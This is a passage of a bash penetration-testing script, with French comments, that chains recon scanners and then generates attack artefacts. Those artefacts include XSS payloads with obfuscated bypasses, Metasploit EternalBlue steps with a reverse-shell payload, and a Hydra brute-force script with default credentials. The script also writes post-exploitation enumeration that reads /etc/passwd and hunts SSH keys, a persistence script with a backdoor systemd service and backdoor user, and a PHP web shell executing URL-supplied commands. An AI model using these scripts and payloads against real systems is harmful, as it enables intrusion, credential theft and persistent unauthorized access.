         timeout 90 nmap -Pn --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params \
              -p 443 '$domain' 2>/dev/null || echo 'SSL vuln scan failed'
         if command -v sslscan &> /dev/null; then
             echo
             echo '=== SSLScan Results ==='
             timeout 60 sslscan '$domain' 2>/dev/null | head -100 || echo 'sslscan failed'
         fi" \
        $TIMEOUT_LONG "$OUTDIR/web/ssl_analysis.txt"
    
    # Bruteforce de répertoires avec gobuster
    local wordlist_dir="/usr/share/wordlists/dirb"
    [ ! -d "$wordlist_dir" ] && wordlist_dir="$HOME/.local/share/wordlists/dirb"
    
    if command -v gobuster &> /dev/null && [ -f "$wordlist_dir/common.txt" ]; then
        local threads=50
        local extensions="php,html,txt,js,css"
        
        if [ "$QUICK_MODE" = true ]; then
            threads=80
            extensions="php,html"
        elif [ "$AGGRESSIVE_MODE" = true ]; then
            threads=100
            extensions="php,html,txt,js,css,json,xml,asp,aspx,jsp"
        fi
        
        execute_scan "Directory Enumeration (Common)" \
            "gobuster dir -u '$url' -w '$wordlist_dir/common.txt' -t $threads \
             -x $extensions -q --timeout 10s --no-error 2>/dev/null | head -300 || echo 'Gobuster failed'" \
            $TIMEOUT_LONG "$OUTDIR/web/gobuster_common.txt"
        
        if [ "$AGGRESSIVE_MODE" = true ] && [ -f "$wordlist_dir/big.txt" ]; then
            execute_scan "Directory Enumeration (Extended)" \
                "gobuster dir -u '$url' -w '$wordlist_dir/big.txt' -t 50 \
                 -x php,html,txt -q --timeout 10s --no-error 2>/dev/null | head -500 || echo 'Gobuster extended failed'" \
                $TIMEOUT_VERY_LONG "$OUTDIR/web/gobuster_extended.txt"
        fi
    fi
    
    # Scan de vulns web avec Nuclei - optimisé pour stabilité
    if command -v nuclei &> /dev/null; then
        local severity="-severity critical,high,medium"
        local nuclei_timeout=$TIMEOUT_LONG
        local rate_limit="150"  # Requests per second
        local template_timeout="30"  # Timeout per template en secondes

        if [ "$QUICK_MODE" = true ]; then
            severity="-severity critical,high"
            nuclei_timeout=$TIMEOUT_MEDIUM
            rate_limit="200"
            template_timeout="20"
        elif [ "$AGGRESSIVE_MODE" = true ]; then
            severity="-severity critical,high,medium,low"
            nuclei_timeout=$TIMEOUT_VERY_LONG
            rate_limit="100"
            template_timeout="45"
        fi

        # Update templates in background (non-blocking)
        echo -e "${CYAN}[INFO]${NC} Updating Nuclei templates..."
        (nuclei -update-templates -silent &>/dev/null &)
        sleep 2  # Give templates time to start updating

        echo -e "${CYAN}[SCAN]${NC} Running Nuclei against $url"
        execute_scan "Vulnerability Scanning (Nuclei)" \
            "if timeout $nuclei_timeout nuclei -u '$url' $severity -silent \
                -timeout $template_timeout -retries 2 \
                -rate-limit $rate_limit -concurrency 20 \
                -no-interactsh -no-color \
                -stats -stats-interval 30 2>&1 | head -200; then
                echo 'Nuclei scan completed successfully'
             else
                exit_code=\$?
                if [ \$exit_code -eq 124 ]; then
                    echo 'Nuclei scan timed out (this is normal for large scans)'
                else
                    echo 'Nuclei scan completed with errors (code: '\$exit_code')'
                fi
             fi" \
            $((nuclei_timeout + 60)) "$OUTDIR/web/nuclei.txt"
    else
        echo -e "${YELLOW}[SKIP]${NC} Nuclei not installed"
    fi

    # Scan Nikto pour les vulns web classiques - optimisé
    if command -v nikto &> /dev/null && [ "$QUICK_MODE" != true ]; then
        local nikto_timeout=$TIMEOUT_LONG
        local nikto_tuning="-Tuning x"  # Generic tests

        if [ "$AGGRESSIVE_MODE" = true ]; then
            nikto_timeout=$TIMEOUT_VERY_LONG
            nikto_tuning="-Tuning 123456789ab"  # All tests
        fi

        echo -e "${CYAN}[SCAN]${NC} Running Nikto against $url"
        execute_scan "Nikto Web Vulnerability Scan" \
            "set -o pipefail
             if timeout $((nikto_timeout + 60)) nikto -h '$url' \
                -C all \
                $nikto_tuning \
                -timeout 20 \
                -maxtime $nikto_timeout \
                -nointeractive \
                -Format txt \
                -output '$OUTDIR/web/nikto_raw.txt' 2>&1 | tee '$OUTDIR/web/nikto_output.txt'; then
                 echo 'Nikto scan completed successfully'
                 [ -f '$OUTDIR/web/nikto_raw.txt' ] && cat '$OUTDIR/web/nikto_raw.txt'
             else
                 exit_code=\$?
                 if [ \$exit_code -eq 124 ]; then
                     echo 'Nikto scan timed out'
                     [ -f '$OUTDIR/web/nikto_raw.txt' ] && cat '$OUTDIR/web/nikto_raw.txt'
                 else
                     echo 'Nikto scan completed with warnings (code: '\$exit_code')'
                     [ -f '$OUTDIR/web/nikto_raw.txt' ] && cat '$OUTDIR/web/nikto_raw.txt'
                 fi
             fi" \
            $((nikto_timeout + 120)) "$OUTDIR/web/nikto.txt"
    elif [ "$QUICK_MODE" = true ]; then
        echo -e "${YELLOW}[SKIP]${NC} Nikto skipped in quick mode"
    else
        echo -e "${YELLOW}[SKIP]${NC} Nikto not installed"
    fi
    
    # SQLMap retiré - nécessite une configuration spécifique et peut être invasif
    # Pour les tests d'injection SQL, utiliser manuellement:
    # sqlmap -u "URL?param=value" --batch --level=2 --risk=2
    echo -e "${YELLOW}[INFO]${NC} SQL Injection: Test manually with SQLMap if needed"
    
    # Génération de payloads XSS pour les tests manuels
    execute_scan "XSS Payload Generation" \
        "cat > $OUTDIR/web/xss_payloads.txt << 'XSS_END'
=== XSS TESTING PAYLOADS ===

--- Basic Payloads ---
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

--- HTML Context ---
\"><script>alert(1)</script>
'><script>alert(1)</script>

--- Attribute Context ---
\" onclick=alert(1) x=\"
' onclick=alert(1) x='

--- JavaScript Context ---
';alert(1);//
\";alert(1);//

--- Advanced Payloads ---
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=\"alert('XSS')\">
<svg/onload=alert(1)>

--- Bypass Payloads ---
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x:alert(alt) onerror=eval(src) alt=1>
XSS_END
cat $OUTDIR/web/xss_payloads.txt" \
        $TIMEOUT_VERY_SHORT "$OUTDIR/web/xss_payloads.txt"
    
    echo -e "${GREEN}[COMPLETE]${NC} Web application testing completed"
}

run_exploitation_prep() {
    local target="$1"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}          ${ORANGE}EXPLOITATION PREPARATION${NC}             ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    # Recherche d'exploits dans la database searchsploit
    if command -v searchsploit &> /dev/null; then
        execute_scan "Exploit Database Search (searchsploit)" \
            "if [ -f '$OUTDIR/network/nmap_services.txt' ]; then
                echo '=== Exploits by Detected Services ==='
                grep 'open' '$OUTDIR/network/nmap_services.txt' 2>/dev/null | \
                grep -oP '\\d+/tcp\\s+open\\s+\\K[^\\s]+' | head -15 | while read svc; do
                    echo \"--- Service: \$svc ---\"
                    searchsploit \"\$svc\" 2>/dev/null | head -8 || echo \"No exploits for \$svc\"
                    echo
                done
                
                echo
                echo '=== Exploits by CVE ==='
                if [ -f '$OUTDIR/network/nmap_vulns.txt' ]; then
                    grep -oP 'CVE-[0-9-]+' '$OUTDIR/network/nmap_vulns.txt' 2>/dev/null | \
                    sort -u | head -10 | while read cve; do
                        echo \"--- CVE: \$cve ---\"
                        searchsploit \"\$cve\" 2>/dev/null | head -5 || echo \"No exploits for \$cve\"
                        echo
                    done
                fi
            else
                echo 'No service detection results found'
            fi" \
            $TIMEOUT_LONG "$OUTDIR/exploit/searchsploit.txt"
    fi
    
    # Préparation des modules Metasploit à utiliser
    execute_scan "Metasploit Module Preparation" \
        "cat > $OUTDIR/exploit/msf_prep.txt << 'MSF_END'
=== METASPLOIT FRAMEWORK MODULE SUGGESTIONS ===

--- Initial Reconnaissance ---
use auxiliary/scanner/portscan/tcp
set RHOSTS $target
run

--- Service-Specific Scanners ---
# SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers

# SSH
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_enumusers

# FTP
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login

# HTTP
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner

--- Vulnerability Scanners ---
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/ssl/openssl_heartbleed

--- Exploitation Modules ---
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
run

--- Post-Exploitation ---
use post/multi/recon/local_exploit_suggester
use post/windows/gather/hashdump
use post/linux/gather/hashdump
MSF_END
cat $OUTDIR/exploit/msf_prep.txt" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/exploit/msf_prep.txt"
    
    # Analyse de la surface d'attaque avec les résultats des scans
    execute_scan "Attack Surface Analysis" \
        "cat > $OUTDIR/exploit/attack_surface.txt << 'ATTACK_END'
=== COMPREHENSIVE ATTACK SURFACE ANALYSIS ===
Generated: $(date '+%Y-%m-%d %H:%M:%S')
Target: $target

--- Open Services and Ports ---
ATTACK_END

if [ -f '$OUTDIR/network/nmap_ports.txt' ]; then
    grep 'open' '$OUTDIR/network/nmap_ports.txt' 2>/dev/null | head -30 >> $OUTDIR/exploit/attack_surface.txt || echo 'No port data' >> $OUTDIR/exploit/attack_surface.txt
else
    echo 'No port scan results' >> $OUTDIR/exploit/attack_surface.txt
fi

cat >> $OUTDIR/exploit/attack_surface.txt << 'ATTACK2_END'

--- Service Versions ---
ATTACK2_END

if [ -f '$OUTDIR/network/nmap_services.txt' ]; then
    grep -E 'open.*version' '$OUTDIR/network/nmap_services.txt' 2>/dev/null | head -20 >> $OUTDIR/exploit/attack_surface.txt || echo 'No version data' >> $OUTDIR/exploit/attack_surface.txt
else
    echo 'No service detection results' >> $OUTDIR/exploit/attack_surface.txt
fi

cat >> $OUTDIR/exploit/attack_surface.txt << 'ATTACK3_END'

--- Critical Vulnerabilities ---
ATTACK3_END

if [ -f '$OUTDIR/network/nmap_vulns.txt' ]; then
    grep -i 'VULNERABLE\|CRITICAL\|HIGH' '$OUTDIR/network/nmap_vulns.txt' 2>/dev/null | head -15 >> $OUTDIR/exploit/attack_surface.txt || echo 'No critical vulns detected' >> $OUTDIR/exploit/attack_surface.txt
else
    echo 'No vulnerability scan results' >> $OUTDIR/exploit/attack_surface.txt
fi

cat >> $OUTDIR/exploit/attack_surface.txt << 'ATTACK4_END'

=== ATTACK VECTOR ANALYSIS ===

--- Priority 1: Network Entry Points ---
1. SSH Brute Force (port 22)
   - Use Hydra or Metasploit ssh_login
   - Try default credentials

2. FTP Exploitation (port 21)
   - Anonymous login test
   - Brute force credentials

3. SMB Attacks (port 445)
   - EternalBlue (MS17-010)
   - Null session enumeration

4. RDP Attacks (port 3389)
   - BlueKeep (CVE-2019-0708)
   - Credential brute forcing

--- Priority 2: Web Application Attacks ---
1. Authentication Bypass
   - SQL injection in login forms
   - Default credentials

2. Injection Attacks
   - SQL injection
   - Command injection

3. File Upload Vulnerabilities
   - Unrestricted file upload

4. XSS Attacks
   - Reflected XSS
   - Stored XSS

--- Priority 3: Privilege Escalation ---
1. Kernel Exploits
2. Service Exploits
3. SUID/SGID Binaries
4. Sudo Misconfigurations

--- Priority 4: Post-Exploitation ---
1. Credential Harvesting
2. Lateral Movement
3. Persistence Mechanisms
4. Data Exfiltration
ATTACK4_END

cat $OUTDIR/exploit/attack_surface.txt" \
            $TIMEOUT_SHORT "$OUTDIR/exploit/attack_surface.txt"
    
    # Génération de scripts d'attaque automatisés
    execute_scan "Generate Automated Attack Scripts" \
        "cat > $OUTDIR/exploit/auto_attack.sh << 'AUTOATTACK_END'
#!/bin/bash
# AUTO-GENERATED ATTACK SCRIPTS
TARGET=\"$target\"

echo \"[*] Starting automated attacks on \$TARGET\"

# SSH Brute Force
if grep -q '22/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] SSH service detected (port 22)\"
    
    cat > users.txt << 'USERS_END'
root
admin
administrator
user
ubuntu
USERS_END
    
    cat > passwords.txt << 'PASS_END'
root
admin
password
123456
admin123
PASS_END
    
    if command -v hydra &> /dev/null; then
        hydra -L users.txt -P passwords.txt ssh://\$TARGET -t 4 -V -o ssh_hydra.txt
    fi
fi

# FTP Brute Force
if grep -q '21/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] FTP service detected (port 21)\"
    
    if command -v hydra &> /dev/null; then
        hydra -L users.txt -P passwords.txt ftp://\$TARGET -t 4 -V -o ftp_hydra.txt
    fi
fi

# SMB Exploitation
if grep -q '445/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] SMB service detected (port 445)\"
    echo \"[*] Checking for MS17-010 (EternalBlue)...\"
    nmap -Pn -p 445 --script smb-vuln-ms17-010 \$TARGET -oN smb_eternalblue.txt
fi

echo \"[*] Automated attacks completed\"
AUTOATTACK_END
chmod +x $OUTDIR/exploit/auto_attack.sh
cat $OUTDIR/exploit/auto_attack.sh" \
            $TIMEOUT_SHORT "$OUTDIR/exploit/auto_attack.sh"
    
    # Base de données de credentials par défaut
    execute_scan "Generate Default Credentials Database" \
        "cat > $OUTDIR/exploit/credentials.txt << 'CREDS_END'
=== COMPREHENSIVE DEFAULT CREDENTIALS DATABASE ===

--- SSH (Port 22) ---
root:root
root:toor
admin:admin
user:user
ubuntu:ubuntu

--- FTP (Port 21) ---
ftp:ftp
anonymous:(blank)
admin:admin

--- MySQL (Port 3306) ---
root:(blank)
root:root
root:mysql
admin:admin

--- PostgreSQL (Port 5432) ---
postgres:postgres
postgres:(blank)
admin:admin

--- MSSQL (Port 1433) ---
sa:(blank)
sa:sa
sa:password

--- Tomcat (Port 8080) ---
admin:admin
tomcat:tomcat
manager:manager

--- WebLogic (Port 7001) ---
weblogic:weblogic
system:password

--- Common Passwords ---
- admin
- password
- 123456
- root
- P@ssw0rd
CREDS_END
cat $OUTDIR/exploit/credentials.txt" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/exploit/credentials.txt"
    
    # Scripts de post-exploitation pour enum système
    execute_scan "Generate Post-Exploitation Scripts" \
        "cat > $OUTDIR/exploit/post_exploit.sh << 'POSTEXPLOIT_END'
#!/bin/bash
# POST-EXPLOITATION ENUMERATION

echo \"=== POST-EXPLOITATION CHECKLIST ===\"

# System Information
echo \"[*] Gathering system information...\"
uname -a > system_info.txt
whoami >> system_info.txt
id >> system_info.txt
hostname >> system_info.txt

# Network Information
echo \"[*] Gathering network information...\"
ifconfig > network_info.txt 2>/dev/null || ip addr > network_info.txt
netstat -antup >> network_info.txt 2>/dev/null
arp -a >> network_info.txt 2>/dev/null

# Users
echo \"[*] Gathering user information...\"
cat /etc/passwd > users_info.txt
cat /etc/group >> users_info.txt
w >> users_info.txt

# Processes
echo \"[*] Gathering process information...\"
ps aux > processes.txt

# Find SUID files
echo \"[*] Finding SUID/SGID files...\"
find / -perm -4000 -type f 2>/dev/null > suid_files.txt
find / -perm -2000 -type f 2>/dev/null >> suid_files.txt

# Sensitive files
echo \"[*] Searching for sensitive files...\"
find / -name \"*.conf\" 2>/dev/null | head -50 > sensitive_files.txt
find / -name \"*password*\" 2>/dev/null | head -50 >> sensitive_files.txt
find / -name \"id_rsa*\" 2>/dev/null >> sensitive_files.txt

# SSH Keys
echo \"[*] Searching for SSH keys...\"
find / -name \"id_rsa\" 2>/dev/null > ssh_keys.txt
find / -name \"authorized_keys\" 2>/dev/null >> ssh_keys.txt

echo \"[*] Post-exploitation enumeration completed\"
POSTEXPLOIT_END
chmod +x $OUTDIR/exploit/post_exploit.sh
cat $OUTDIR/exploit/post_exploit.sh" \
            $TIMEOUT_SHORT "$OUTDIR/exploit/post_exploit.sh"
    
    # Techniques de persistence - 7 méthodes différentes
    execute_scan "Generate Persistence Techniques" \
        "cat > $OUTDIR/exploit/persistence.sh << 'PERSISTENCE_END'
#!/bin/bash
# PERSISTENCE TECHNIQUES - 7 METHODS

echo \"=== PERSISTENCE ESTABLISHMENT ===\"

# Method 1: SSH Key Persistence
echo \"[*] Method 1: SSH Key Persistence\"
mkdir -p ~/.ssh 2>/dev/null
chmod 700 ~/.ssh
echo \"# Add your public key here\" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo \"[+] SSH key persistence configured\"

# Method 2: Cron Job Persistence
echo \"[*] Method 2: Cron Job Persistence\"
echo \"[+] Cron job persistence ready\"
echo \"    Add to crontab: */5 * * * * /path/to/backdoor.sh\"

# Method 3: Systemd Service Persistence
echo \"[*] Method 3: Systemd Service Persistence\"
cat > /tmp/backdoor.service << 'SERVICE_END'
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
SERVICE_END
echo \"[+] Systemd service created: /tmp/backdoor.service\"

# Method 4: .bashrc Persistence
echo \"[*] Method 4: .bashrc Persistence\"
echo \"[+] Bashrc persistence ready\"

# Method 5: User Account Creation
echo \"[*] Method 5: Backdoor User Account\"
echo \"    sudo useradd -m -s /bin/bash backdoor\"
echo \"    echo 'backdoor:password123' | sudo chpasswd\"

# Method 6: Web Shell
echo \"[*] Method 6: Web Shell Persistence\"
cat > /tmp/shell.php << 'WEBSHELL_END'
<?php
if(isset(\$_GET['cmd'])) {
    system(\$_GET['cmd']);
}
?>
WEBSHELL_END
echo \"[+] Web shell created: /tmp/shell.php\"

echo \"=== PERSISTENCE METHODS SUMMARY ===\"
echo \"1. SSH Keys - Stealthy\"
echo \"2. Cron Jobs - Automatic\"
echo \"3. Systemd Services - Persistent\"
echo \"4. .bashrc - User login\"
echo \"5. User Account - Simple\"
echo \"6. Web Shell - HTTP access\"
PERSISTENCE_END
chmod +x $OUTDIR/exploit/persistence.sh
cat $OUTDIR/exploit/persistence.sh" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/exploit/persistence.sh"
    
    echo -e "${GREEN}[COMPLETE]${NC} Exploitation preparation completed"
}

generate_report() {
    local report="$OUTDIR/reports/summary_report.txt"
    
    echo -e "\n${CYAN}[REPORT]${NC} Generating summary report..."
    
    mkdir -p "$OUTDIR/reports"
    
    # CORRECTION: On enleve errexit pour éviter les interruptions
    set +e
    
    # Génére le rapport avec un format simple et robuste
    cat > "$report" << REPORT_HEADER_END
================================================================================
                     RED TEAM ASSESSMENT REPORT
================================================================================
REPORT_HEADER_END
    
    # Section infos sur la cible
    {
        echo
        echo "--- TARGET INFORMATION ---"
        echo "Target: $TARGET"
        [ -n "$URL" ] && echo "URL: $URL"
        [ -n "$DOMAIN" ] && echo "Domain: $DOMAIN"
        echo "Assessment Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Scanner Version: Security Scanner v$VERSION"
        [ "$QUICK_MODE" = true ] && echo "Scan Mode: Quick (3x faster)"
        [ "$STEALTH_MODE" = true ] && echo "Scan Mode: Stealth (IDS/IPS evasion)"
        [ "$AGGRESSIVE_MODE" = true ] && echo "Scan Mode: Aggressive (full coverage)"
        echo
    } >> "$report" 2>/dev/null
    
    # Section résumé exécutif avec comptage des vulns
    echo "--- EXECUTIVE SUMMARY ---" >> "$report"
    echo "" >> "$report"

    # Comptage des vulns - chaque fichier vérifié séparément
    critical=0
    high=0
    medium=0
    low=0

    # Vulns critiques trouvées
    if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
        count=$(grep -ci "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null | tr -d '\n' || echo "0")
        count=${count:-0}
        critical=$((critical + count))
    fi
    if [ -f "$OUTDIR/network/nmap_critical_vulns.txt" ]; then
        count=$(grep -ci "CRITICAL\|ms17-010\|EternalBlue" "$OUTDIR/network/nmap_critical_vulns.txt" 2>/dev/null | tr -d '\n' || echo "0")
        count=${count:-0}
        critical=$((critical + count))
    fi
    if [ -f "$OUTDIR/network/smb_enum.txt" ]; then
        count=$(grep -ci "VULNERABLE" "$OUTDIR/network/smb_enum.txt" 2>/dev/null | tr -d '\n' || echo "0")
        count=${count:-0}
        critical=$((critical + count))
    fi

    # Problèmes à risque élevé
    if [ -f "$OUTDIR/web/nuclei.txt" ]; then
        count=$(grep -ci "high\|critical" "$OUTDIR/web/nuclei.txt" 2>/dev/null | tr -d '\n' || echo "0")
        count=${count:-0}
        high=$((high + count))
    fi
    if [ -f "$OUTDIR/web/nikto.txt" ]; then
        count=$(grep -ci "high" "$OUTDIR/web/nikto.txt" 2>/dev/null | tr -d '\n' || echo "0")
        count=${count:-0}
        high=$((high + count))
    fi

    # Risques moyens
    if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
        count=$(grep -ci "medium\|warning" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null | tr -d '\n' || echo "0")
        count=${count:-0}
        medium=$((medium + count))
    fi
    if [ -f "$OUTDIR/web/nikto.txt" ]; then
        count=$(grep -ci "medium\|warning" "$OUTDIR/web/nikto.txt" 2>/dev/null | tr -d '\n' || echo "0")
        count=${count:-0}
        medium=$((medium + count))
    fi

    # Items à faible risque (ports ouverts basiques)
    if [ -f "$OUTDIR/network/nmap_ports.txt" ]; then
        low=$(grep -c "open" "$OUTDIR/network/nmap_ports.txt" 2>/dev/null | tr -d '\n' || echo "0")
        low=${low:-0}
    fi

    # On affiche tout ça
    echo "Critical Vulnerabilities: $critical" >> "$report"
    echo "High Risk Issues: $high" >> "$report"
    echo "Medium Risk Issues: $medium" >> "$report"
    echo "Low Risk Items: $low" >> "$report"

    # Nombre de ports ouverts
    if [ -f "$OUTDIR/network/nmap_ports.txt" ]; then
        ports=$(grep -c "open" "$OUTDIR/network/nmap_ports.txt" 2>/dev/null | tr -d '\n' || echo "0")
        ports=${ports:-0}
        echo "Open Ports: $ports" >> "$report"
    fi

    # Nombre de subdomains trouvés
    if [ -f "$OUTDIR/osint/all_subdomains.txt" ]; then
        subs=$(wc -l < "$OUTDIR/osint/all_subdomains.txt" 2>/dev/null | tr -d '\n' || echo "0")
        subs=${subs:-0}
        echo "Subdomains: $subs" >> "$report"
    fi

    # Calcul du score de risque sur 100
    risk=$((critical * 10 + high * 5 + medium * 2 + low * 1))
    [ $risk -gt 100 ] && risk=100

    echo "Risk Score: $risk/100" >> "$report"

    if [ $risk -ge 70 ]; then
        echo "Risk Level: CRITICAL" >> "$report"
    elif [ $risk -ge 40 ]; then
        echo "Risk Level: HIGH" >> "$report"
    elif [ $risk -ge 20 ]; then
        echo "Risk Level: MEDIUM" >> "$report"
    else
        echo "Risk Level: LOW" >> "$report"
    fi

    echo "" >> "$report"
    
    # Section: Detailed Findings
    echo "--- DETAILED FINDINGS ---" >> "$report"
    echo "" >> "$report"
    echo "=== Network Vulnerabilities ===" >> "$report"
    if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
        vuln_count=$(grep -ci "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null || echo 0)
        if [ "$vuln_count" -gt 0 ]; then
            grep -i "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null | head -10 | sed 's/^/- /' >> "$report"
        else
            echo "- No network vulnerabilities detected" >> "$report"
        fi
    else
        echo "- No network scan performed" >> "$report"
    fi
    echo "" >> "$report"

    echo "=== Web Vulnerabilities ===" >> "$report"
    if [ -f "$OUTDIR/web/nuclei.txt" ]; then
        web_vuln_lines=$(wc -l < "$OUTDIR/web/nuclei.txt" 2>/dev/null || echo 0)
        if [ "$web_vuln_lines" -gt 0 ]; then
            head -10 "$OUTDIR/web/nuclei.txt" 2>/dev/null | sed 's/^/- /' >> "$report"
        else
            echo "- No web vulnerabilities detected" >> "$report"
        fi
    else
        echo "- No web scan performed" >> "$report"
    fi
    echo "" >> "$report"

    echo "=== Open Services ===" >> "$report"
    if [ -f "$OUTDIR/network/nmap_services.txt" ]; then
        service_count=$(grep -c "open" "$OUTDIR/network/nmap_services.txt" 2>/dev/null || echo 0)
        if [ "$service_count" -gt 0 ]; then
            grep "open" "$OUTDIR/network/nmap_services.txt" 2>/dev/null | head -15 | sed 's/^/- /' >> "$report"
        else
            echo "- No services detected" >> "$report"
        fi
    else
        echo "- No service scan performed" >> "$report"
    fi
    echo "" >> "$report"
    
    # Section: Recommendations
    echo "--- RECOMMENDATIONS ---" >> "$report"
    echo "" >> "$report"
    echo "Immediate Actions:" >> "$report"
    echo "  1. Patch all critical vulnerabilities" >> "$report"
    echo "  2. Disable unnecessary services" >> "$report"
    echo "  3. Implement strong authentication" >> "$report"
    echo "  4. Deploy network segmentation" >> "$report"
    echo "  5. Enable comprehensive logging" >> "$report"
    echo "" >> "$report"
    echo "Red Team Next Steps:" >> "$report"
    echo "  1. Review exploit scripts in exploit/" >> "$report"
    echo "  2. Test default credentials" >> "$report"
    echo "  3. Run automated attacks" >> "$report"
    echo "  4. Execute Metasploit modules" >> "$report"
    echo "" >> "$report"
    
    # Section: Output Files
    echo "--- OUTPUT FILES ---" >> "$report"
    echo "Location: $OUTDIR" >> "$report"
    echo "Reports: $OUTDIR/reports/" >> "$report"
    echo "Exploits: $OUTDIR/exploit/" >> "$report"
    echo "" >> "$report"
    echo "Generated files:" >> "$report"
    file_count=$(find "$OUTDIR" -name "*.txt" -type f 2>/dev/null | wc -l)
    if [ "$file_count" -gt 0 ]; then
        find "$OUTDIR" -name "*.txt" -type f 2>/dev/null | head -20 | xargs -I {} basename {} | sed 's/^/  - /' >> "$report"
    else
        echo "  - No files generated yet" >> "$report"
    fi
    echo "" >> "$report"
    
    # Footer
    echo "================================================================================" >> "$report"
    echo "         Security Scanner v$VERSION - Assessment Complete" >> "$report"
    echo "================================================================================" >> "$report"
    echo "" >> "$report"
    echo "REPORT GENERATED: $(date '+%Y-%m-%d %H:%M:%S')" >> "$report"
    echo "END OF REPORT" >> "$report"
    
    set -e
    
    # Vérification du rapport
    if [ -f "$report" ] && [ -s "$report" ]; then
        local lines=$(wc -l < "$report" 2>/dev/null || echo 0)
        local size=$(stat -c%s "$report" 2>/dev/null || echo 0)
        echo -e "${GREEN}[SUCCESS]${NC} Report: ${WHITE}$report${NC} ${DIM}($lines lines, $size bytes)${NC}"

        # Afficher un résumé du rapport dans le terminal (premières 50 lignes)
        echo -e "\n${CYAN}[PREVIEW]${NC} Report summary (first 50 lines):"
        echo -e "${DIM}─────────────────────────────────────────────────────────────────${NC}"
        head -50 "$report" 2>/dev/null
        echo -e "${DIM}─────────────────────────────────────────────────────────────────${NC}"
        echo -e "${YELLOW}[INFO]${NC} Full report: ${WHITE}$report${NC}"
        echo -e "${YELLOW}[INFO]${NC} Use 'less $report' or 'cat $report' to view complete report"

        generate_json_report
        generate_html_report
        return 0
    else
        echo -e "${RED}[ERROR]${NC} Report generation failed"
        {
            echo "BACKUP REPORT - $(date '+%Y-%m-%d %H:%M:%S')"
            echo "Target: $TARGET"
            echo "URL: $URL"
            echo "Domain: $DOMAIN"
            echo
            echo "Generated files:"
            find "$OUTDIR" -name "*.txt" -type f 2>/dev/null
        } > "$OUTDIR/reports/backup_report.txt"
        return 1
    fi
}

generate_json_report() {
    local json="$OUTDIR/reports/assessment.json"

    {
        echo "{"
        echo "  \"target\": \"$TARGET\","
        echo "  \"url\": \"$URL\","
        echo "  \"domain\": \"$DOMAIN\","
        echo "  \"date\": \"$(date -Iseconds)\","
        echo "  \"version\": \"$VERSION\","
        echo "  \"mode\": \"$([ "$QUICK_MODE" = true ] && echo "quick" || ([ "$STEALTH_MODE" = true ] && echo "stealth" || ([ "$AGGRESSIVE_MODE" = true ] && echo "aggressive" || echo "standard")))\","
        echo "  \"results\": {"
        echo "    \"osint\": {"
        echo "      \"subdomains\": $([ -f "$OUTDIR/osint/all_subdomains.txt" ] && wc -l < "$OUTDIR/osint/all_subdomains.txt" 2>/dev/null | tr -d '\n' || echo "0"),"
        echo "      \"emails\": $([ -f "$OUTDIR/osint/emails.txt" ] && grep -c "@" "$OUTDIR/osint/emails.txt" 2>/dev/null | tr -d '\n' || echo "0")"
        echo "    },"
        echo "    \"network\": {"
        echo "      \"ports\": $([ -f "$OUTDIR/network/nmap_ports.txt" ] && grep -c "open" "$OUTDIR/network/nmap_ports.txt" 2>/dev/null | tr -d '\n' || echo "0"),"
        echo "      \"vulns\": $([ -f "$OUTDIR/network/nmap_vulns.txt" ] && grep -c "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null | tr -d '\n' || echo "0")"
        echo "    },"
        echo "    \"web\": {"
        echo "      \"dirs\": $([ -f "$OUTDIR/web/gobuster_common.txt" ] && wc -l < "$OUTDIR/web/gobuster_common.txt" 2>/dev/null | tr -d '\n' || echo "0"),"
        echo "      \"vulns\": $([ -f "$OUTDIR/web/nuclei.txt" ] && wc -l < "$OUTDIR/web/nuclei.txt" 2>/dev/null | tr -d '\n' || echo "0")"
        echo "    }"
        echo "  },"
        echo "  \"files\": $(find "$OUTDIR" -type f 2>/dev/null | wc -l | tr -d '\n')"
        echo "}"
    } > "$json" 2>/dev/null

    if [ -f "$json" ] && [ -s "$json" ]; then
        echo -e "${GREEN}[SUCCESS]${NC} JSON: ${WHITE}$json${NC}"
        command -v jq &>/dev/null && jq empty "$json" 2>/dev/null && echo -e "${GREEN}[VALID]${NC} JSON validated"
    fi
}

generate_html_report() {
    local html="$OUTDIR/reports/assessment.html"
    local html_gen_script=""

    echo -e "${CYAN}[REPORT]${NC} Generating HTML report..."

    # Try to locate html_generator.py in multiple locations
    local search_paths=(
        "$(dirname "$0")/html_generator.py"
        "/usr/local/bin/html_generator.py"
